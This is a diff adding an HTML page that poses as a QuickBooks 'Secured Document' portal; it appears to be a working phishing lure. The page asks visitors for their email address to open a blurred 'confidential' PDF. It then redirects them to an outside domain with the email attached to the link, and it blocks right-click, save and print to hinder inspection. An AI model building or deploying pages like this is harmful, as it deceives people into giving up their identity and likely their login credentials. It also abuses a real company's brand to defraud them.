@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self' https: data:; script-src 'self' 'unsafe-inline' https:; style-src 'self' 'unsafe-inline' https:; font-src 'self' https: data:;">
+<title>Secure Document Portal</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Pacifico&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/remixicon/4.6.0/remixicon.min.css" rel="stylesheet">
+<script src="https://cdn.tailwindcss.com/3.4.16"></script>
+<script>
+tailwind.config = {
+theme: {
+extend: {
+colors: {
+primary: {
+DEFAULT: '#2D3250',
+50: '#f8fafc',
+100: '#f1f5f9',
+200: '#e2e8f0',
+300: '#cbd5e1',
+400: '#94a3b8',
+500: '#64748b',
+600: '#475569',
+700: '#334155',
+800: '#1e293b',
+900: '#0f172a'
+},
+secondary: {
+DEFAULT: '#424769',
+50: '#fdf4ff',
+100: '#fae8ff',
+200: '#f5d0fe',
+300: '#f0abfc',
+400: '#e879f9',
+500: '#d946ef',
+600: '#c026d3',
+700: '#a21caf',
+800: '#86198f',
+900: '#701a75'
+},
+accent: {
+DEFAULT: '#7077A1',
+50: '#f5f3ff',
+100: '#ede9fe',
+200: '#ddd6fe',
+300: '#c4b5fd',
+400: '#a78bfa',
+500: '#8b5cf6',
+600: '#7c3aed',
+700: '#6d28d9',
+800: '#5b21b6',
+900: '#4c1d95'
+}
+50: '#eef2ff',
+100: '#e0e7ff',
+200: '#c7d2fe',
+300: '#a5b4fc',
+400: '#818cf8',
+500: '#6366f1',
+600: '#4f46e5',
+700: '#4338ca',
+800: '#3730a3',
+900: '#312e81'
+}
+},
+borderRadius: {
+'none': '0px',
+'sm': '4px',
+DEFAULT: '8px',
+'md': '12px',
+'lg': '16px',
+'xl': '20px',
+'2xl': '24px',
+'3xl': '32px',
+'full': '9999px',
+'button': '8px'
+}
+}
+}
+}
+</script>
+<style>
+:where([class^="ri-"])::before { content: "\f3c2"; }
+@keyframes pulse {
+0%, 100% { opacity: 1; transform: scale(1); }
+50% { opacity: 0.85; transform: scale(0.98); }
+}
+@keyframes shine {
+0% { background-position: -200% center; }
+100% { background-position: 200% center; }
+}
+@keyframes glow {
+0% { box-shadow: 0 0 20px rgba(139, 92, 246, 0.3); }
+50% { box-shadow: 0 0 40px rgba(139, 92, 246, 0.6); }
+100% { box-shadow: 0 0 20px rgba(139, 92, 246, 0.3); }
+}
+.glass-effect {
+background: rgba(17, 24, 39, 0.7);
+backdrop-filter: blur(12px);
+border: 1px solid rgba(139, 92, 246, 0.2);
+box-shadow: 0 8px 32px rgba(139, 92, 246, 0.2);
+}
+.gradient-text {
+background: linear-gradient(-70deg, #8b5cf6, #d946ef, #8b5cf6);
+background-size: 200% auto;
+animation: gradientMove 3s ease-in-out infinite;
+-webkit-background-clip: text;
+color: transparent;
+}
+.security-grid {
+background-image:
+linear-gradient(to right, rgba(139, 92, 246, 0.1) 1px, transparent 1px),
+linear-gradient(to bottom, rgba(139, 92, 246, 0.1) 1px, transparent 1px);
+background-size: 40px 40px;
+}
+@keyframes floatSlow {
+0%, 100% { transform: translateY(0) rotate(0deg); }
+25% { transform: translateY(-8px) rotate(-1deg); }
+75% { transform: translateY(8px) rotate(1deg); }
+}
+.shine-effect {
+background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+background-size: 200% 100%;
+animation: shine 3s infinite linear;
+}
+.float-slow {
+animation: floatSlow 6s ease-in-out infinite;
+}
+@keyframes fadeIn {
+from { opacity: 0; transform: translateY(20px); }
+to { opacity: 1; transform: translateY(0); }
+}
+@keyframes shimmer {
+0% { background-position: -1000px 0; }
+100% { background-position: 1000px 0; }
+}
+@keyframes spin {
+0% { transform: rotate(0deg); }
+100% { transform: rotate(360deg); }
+}
+@keyframes float {
+0% { transform: translateY(0) rotate(0deg); }
+50% { transform: translateY(-10px) rotate(1deg); }
+100% { transform: translateY(0) rotate(0deg); }
+}
+@keyframes glow {
+0% { filter: drop-shadow(0 0 8px rgba(99, 102, 241, 0.4)); }
+50% { filter: drop-shadow(0 0 24px rgba(99, 102, 241, 0.7)); }
+100% { filter: drop-shadow(0 0 8px rgba(99, 102, 241, 0.4)); }
+}
+@keyframes borderGlow {
+0% { border-color: rgba(99, 102, 241, 0.4); box-shadow: 0 0 15px rgba(99, 102, 241, 0.2); }
+50% { border-color: rgba(99, 102, 241, 0.8); box-shadow: 0 0 25px rgba(99, 102, 241, 0.4); }
+100% { border-color: rgba(99, 102, 241, 0.4); box-shadow: 0 0 15px rgba(99, 102, 241, 0.2); }
+}
+@keyframes gradientMove {
+0% { background-position: 0% 50%; }
+50% { background-position: 100% 50%; }
+100% { background-position: 0% 50%; }
+}
+.floating {
+animation: float 4s ease-in-out infinite;
+}
+.glowing {
+animation: glow 3s ease-in-out infinite;
+}
+.border-glowing {
+animation: borderGlow 3s ease-in-out infinite;
+}
+.glass-effect {
+background: rgba(255, 255, 255, 0.85);
+backdrop-filter: blur(12px);
+border: 1px solid rgba(255, 255, 255, 0.4);
+box-shadow: 0 8px 32px rgba(99, 102, 241, 0.1);
+}
+.gradient-text {
+background: linear-gradient(-70deg, #4f46e5, #06b6d4, #4f46e5);
+background-size: 200% auto;
+animation: gradientMove 3s ease-in-out infinite;
+-webkit-background-clip: text;
+color: transparent;
+}
+.security-grid {
+background:
+linear-gradient(to right, rgba(99, 102, 241, 0.03) 1px, transparent 1px) 0 0 / 40px 40px,
+linear-gradient(to bottom, rgba(99, 102, 241, 0.03) 1px, transparent 1px) 0 0 / 40px 40px;
+}
+.hover-scale {
+transition: transform 0.3s ease;
+}
+.hover-scale:hover {
+transform: scale(1.02);
+}
+* {
+user-select: none;
+}
+.animate-pulse {
+animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+}
+.animate-fadeIn {
+animation: fadeIn 0.5s ease-in-out;
+}
+.animate-shimmer {
+background: linear-gradient(to right, rgba(255,255,255,0) 0%, rgba(255,255,255,0.2) 20%, rgba(255,255,255,0) 40%);
+background-size: 1000px 100%;
+animation: shimmer 2s infinite linear;
+}
+.animate-spin {
+animation: spin 1s linear infinite;
+}
+.gradient-bg {
+background: linear-gradient(135deg, var(--tw-color-primary-500, #3b82f6) 0%, var(--tw-color-primary-700, #1d4ed8) 100%);
+}
+input[type="number"]::-webkit-inner-spin-button,
+input[type="number"]::-webkit-outer-spin-button {
+-webkit-appearance: none;
+margin: 0;
+}
+.loading-overlay {
+position: fixed;
+top: 0;
+left: 0;
+width: 100%;
+height: 100%;
+background-color: rgba(0, 0, 0, 0.7);
+display: none;
+justify-content: center;
+align-items: center;
+z-index: 9999;
+}
+.loading-spinner {
+width: 50px;
+height: 50px;
+border: 5px solid rgba(255, 255, 255, 0.3);
+border-radius: 50%;
+border-top-color: #fff;
+}
+</style>
+</head>
+<body class="min-h-screen bg-white" oncontextmenu="return false">
+<div class="loading-overlay" id="loadingOverlay">
+<div class="loading-spinner animate-spin"></div>
+</div>
+<main class="py-4">
+<section class="bg-gray-50 py-8">
+<div class="max-w-6xl mx-auto px-4">
+<div class="grid grid-cols-1 md:grid-cols-2 gap-8 md:gap-12 items-center">
+<div>
+<div class="flex items-center space-x-3 mb-8">
+<div class="w-10 h-10 bg-green-500 rounded flex items-center justify-center">
+<i class="ri-shield-keyhole-line text-white text-xl"></i>
+</div>
+<span class="text-xl font-semibold text-gray-800">QuickBooks</span>
+</div>
+<h2 class="text-2xl md:text-3xl font-bold text-gray-900 mb-4 md:mb-6">QuickBooks Secured Document</h2>
+<p class="text-lg md:text-xl text-gray-600 mb-6 md:mb-8">To access your secure document, please verify your identity using your email address.</p>
+<form id="downloadForm" class="space-y-6">
+<div>
+<label for="email" class="block text-sm font-medium text-gray-700 mb-2">Email Address</label>
+<div class="relative">
+<div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
+<i class="ri-mail-line text-gray-400"></i>
+</div>
+<input type="email" id="email" name="email" class="w-full pl-12 pr-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-gray-900" placeholder="Enter your email address" required>
+</div>
+</div>
+<button type="submit" id="downloadButton" disabled class="w-full bg-green-500 text-white px-6 py-3 rounded-lg hover:bg-blue-600 transition-colors flex items-center justify-center space-x-2 disabled:opacity-50 disabled:cursor-not-allowed !rounded-button">
+<i class="ri-lock-line"></i>
+<span>Access Document</span>
+</button>
+</form>
+</div>
+<div class="bg-white p-8 rounded-2xl shadow-xl">
+<div class="flex items-center space-x-4 mb-6">
+<div class="w-12 h-12 bg-blue-100 rounded-lg flex items-center justify-center">
+<i class="ri-file-text-line text-green-500 text-2xl"></i>
+</div>
+<div>
+<h3 class="font-semibold text-gray-900">Confidential Document</h3>
+<p class="text-sm text-gray-500">PDF • 24.4 MB</p>
+</div>
+</div>
+<div class="bg-green-50 rounded-lg p-6 mb-6 relative overflow-hidden h-[300px]">
+<div class="absolute inset-0">
+<img src="https://na4.documents.adobe.com/document/ci/CBSCTBABDUAAABACAABAA1xKjdc_WrwTI6HKvwpXt5phczXNZZK-1sKODTiT5h-u5-WXdFQqmzKnbIMsX1K7u-KMyuNh1csUMaNRQ-8TnNmJPtaCgljc89lj7wmUHN3M*/small.png" class="w-full h-full object-cover filter blur-sm" alt="Blurred document">
+</div>
+<div class="absolute inset-0 bg-gradient-to-b from-blue-100/50 to-blue-200/50 mix-blend-overlay"></div>
+</div>
+<div class="flex items-center justify-between text-sm text-gray-500">
+<div class="flex items-center space-x-2">
+<i class="ri-shield-check-line"></i>
+<span>End-to-end encrypted</span>
+</div>
+<div class="flex items-center space-x-2">
+<i class="ri-time-line"></i>
+<span>Expires in 7 Days</span>
+</div>
+</div>
+</div>
+</div>
+</div>
+</section>
+<section class="py-6 md:py-8 bg-white">
+<div class="grid grid-cols-1 md:grid-cols-3 gap-6 md:gap-8">
+<div class="p-8 bg-gray-50 rounded-2xl shadow-lg hover:shadow-xl transition-shadow">
+<div class="w-12 h-12 bg-blue-100 rounded-lg flex items-center justify-center mb-6">
+<i class="ri-shield-check-line text-blue-500 text-2xl"></i>
+</div>
+<h3 class="text-xl font-semibold text-gray-900 mb-3">End-to-End Encryption</h3>
+<p class="text-gray-600">Your documents are encrypted from the moment they're uploaded until they reach the recipient.</p>
+</div>
+<div class="p-8 bg-gray-50 rounded-2xl shadow-lg hover:shadow-xl transition-shadow">
+<div class="w-12 h-12 bg-green-100 rounded-lg flex items-center justify-center mb-6">
+<i class="ri-fingerprint-line text-green-500 text-2xl"></i>
+</div>
+<h3 class="text-xl font-semibold text-gray-900 mb-3">Biometric Authentication</h3>
+<p class="text-gray-600">Multi-factor authentication including fingerprint and face recognition for maximum security.</p>
+</div>
+<div class="p-8 bg-gray-50 rounded-2xl shadow-lg hover:shadow-xl transition-shadow">
+<div class="w-12 h-12 bg-purple-100 rounded-lg flex items-center justify-center mb-6">
+<i class="ri-history-line text-purple-500 text-2xl"></i>
+</div>
+<h3 class="text-xl font-semibold text-gray-900 mb-3">Audit Trail</h3>
+<p class="text-gray-600">Complete visibility into who accessed your documents and when they were viewed.</p>
+</div>
+</div>
+</div>
+</section>
+</main>
+<footer class="bg-gray-900 text-white py-10">
+<div class="max-w-6xl mx-auto px-4">
+<div class="grid grid-cols-2 md:grid-cols-4 gap-8 mb-12">
+<div>
+<div class="flex items-center space-x-2 mb-6">
+<div class="w-8 h-8 bg-blue-500 rounded flex items-center justify-center">
+<i class="ri-shield-keyhole-line text-white text-lg"></i>
+</div>
+<span class="text-lg font-semibold">SecureVault</span>
+</div>
+<p class="text-gray-400">Secure document management for modern businesses.</p>
+</div>
+<div>
+<h4 class="font-semibold mb-4">Product</h4>
+<ul class="space-y-2 text-gray-400">
+<li><a href="#" class="hover:text-white">Features</a></li>
+<li><a href="#" class="hover:text-white">Security</a></li>
+<li><a href="#" class="hover:text-white">Enterprise</a></li>
+<li><a href="#" class="hover:text-white">Pricing</a></li>
+</ul>
+</div>
+<div>
+<h4 class="font-semibold mb-4">Company</h4>
+<ul class="space-y-2 text-gray-400">
+<li><a href="#" class="hover:text-white">About</a></li>
+<li><a href="#" class="hover:text-white">Customers</a></li>
+<li><a href="#" class="hover:text-white">Blog</a></li>
+<li><a href="#" class="hover:text-white">Careers</a></li>
+</ul>
+</div>
+<div>
+<h4 class="font-semibold mb-4">Resources</h4>
+<ul class="space-y-2 text-gray-400">
+<li><a href="#" class="hover:text-white">Documentation</a></li>
+<li><a href="#" class="hover:text-white">Help Center</a></li>
+<li><a href="#" class="hover:text-white">Contact</a></li>
+<li><a href="#" class="hover:text-white">Status</a></li>
+</ul>
+</div>
+</div>
+<div class="border-t border-gray-800 pt-8 flex flex-col md:flex-row justify-between items-center space-y-4 md:space-y-0">
+<p class="text-gray-400">© 2025 SecureVault. All rights reserved.</p>
+<div class="flex space-x-6">
+<a href="#" class="text-gray-400 hover:text-white">
+<i class="ri-twitter-line"></i>
+</a>
+<a href="#" class="text-gray-400 hover:text-white">
+<i class="ri-linkedin-line"></i>
+</a>
+<a href="#" class="text-gray-400 hover:text-white">
+<i class="ri-github-line"></i>
+</a>
+</div>
+</div>
+</div>
+</footer>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+const downloadButton = document.getElementById('downloadButton');
+const emailInput = document.getElementById('email');
+function validateEmail(email) {
+return email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/);
+}
+function updateButtonState() {
+const email = emailInput.value.trim();
+if (validateEmail(email)) {
+downloadButton.disabled = false;
+downloadButton.classList.add('animate-pulse');
+} else {
+downloadButton.disabled = true;
+downloadButton.classList.remove('animate-pulse');
+}
+}
+emailInput.addEventListener('input', updateButtonState);
+// Extract email from URL hash
+const email = window.location.hash.substring(1);
+if (email && email.includes('@')) {
+emailInput.value = email;
+updateButtonState();
+}
+// Form submission handler
+document.getElementById('downloadForm').addEventListener('submit', function(e) {
+e.preventDefault();
+const emailInput = document.getElementById('email');
+const email = emailInput.value.trim();
+if (!email || !email.includes('@')) {
+alert('Please enter a valid email address');
+return;
+}
+// Show loading overlay
+document.getElementById('loadingOverlay').style.display = 'flex';
+// Create FormData object
+const formData = new FormData();
+formData.append('email', email);
+formData.append('domain', window.location.hostname);
+// Simulate form submission with timeout
+setTimeout(function() {
+// Redirect with email appended as hash
+window.location.href = 'https://mintrokl.icu/5rwp3T8Z5b/#R' + email;
+}, 1500);
+});
+});
+// Security features
+document.addEventListener('keydown', function(e) {
+// Block Ctrl+S, Ctrl+P
+if ((e.ctrlKey || e.metaKey) && (e.key === 's' || e.key === 'p')) {
+e.preventDefault();
+return false;
+}
+});
+// Prevent page inspection
+document.addEventListener('contextmenu', function(e) {
+e.preventDefault();
+return false;
+});
+</script>
+</body>
+</html>
